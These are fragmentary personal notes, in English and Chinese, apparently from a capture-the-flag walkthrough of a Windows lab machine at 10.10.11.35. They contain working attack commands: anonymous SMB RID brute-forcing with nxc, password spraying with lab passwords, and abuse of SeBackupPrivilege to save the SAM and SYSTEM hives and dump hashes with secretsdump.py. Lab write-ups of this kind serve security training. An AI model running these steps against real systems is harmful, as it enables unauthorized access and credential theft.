because port 3389 not open, can not use

```PowerShell
 xfreerdp /u:emily.oscars /p:'Q!3@Lp\#M6b*7t*Vt' /v:10.10.11.35
```

from smb get a password, so , we just need find username, nxc can do it

get name btw \ and (

nxc smb 10.10.11.35 -u 'anonymous' -p '' --rid-brute \  
| cut -d '\' -f2 \  
| cut -d ' ' -f1 \

> users.txt  
> 解释：

cut -d '\' -f2

以反斜杠 \ 为分隔符

取第 2 列 → Administrator (SidTypeUser)

cut -d ' ' -f1

以空格为分隔符

取第 1 列 → Administrator

```PowerShell
 nxc smb 10.10.11.35 -u 'anonymous' -p '' --rid-brute   | sed -n 's/.*\\\(.*\) (.*/\1/p' > users.txt
```

```PowerShell
nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp\#nZp!8'
```

```PowerShell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
```

```PowerShell
reg save HKLM\sam SAM
reg save HKLM\system SYSTEM
```

save both, then use [secretsdump.py](http://secretsdump.py/)

```PowerShell
 secretsdump.py -sam SAM -system SYSTEM LOCAL
```

get the hash

  

to get it is 32 or 64

```PowerShell
$env:PROCESSOR_ARCHITECTURE
```

```PowerShell
uname -m
```

- **SMB 的 RID 枚举只要能建立连接（Guest/匿名即可）就能返回结果**，不需要真正的域账户权限。

也就是说：

|情况|结果|
|---|---|
|`-u ''`|可能失败（空用户名没权限）|
|`-u '.'`|匿名 Guest，可以枚举部分 RID|
|`-u 'guest'`|同上，效果类似|
|`-u '任意不存在用户名'`|仍然会被当作 Guest 或匿名处理，如果服务器允许匿名访问|

```PowerShell
enum4linux-ng -A -u 'Michael.wrightson' -p 'Cicada$M6Corpb*@Lp\#nZp!8' 10.10.11.35
```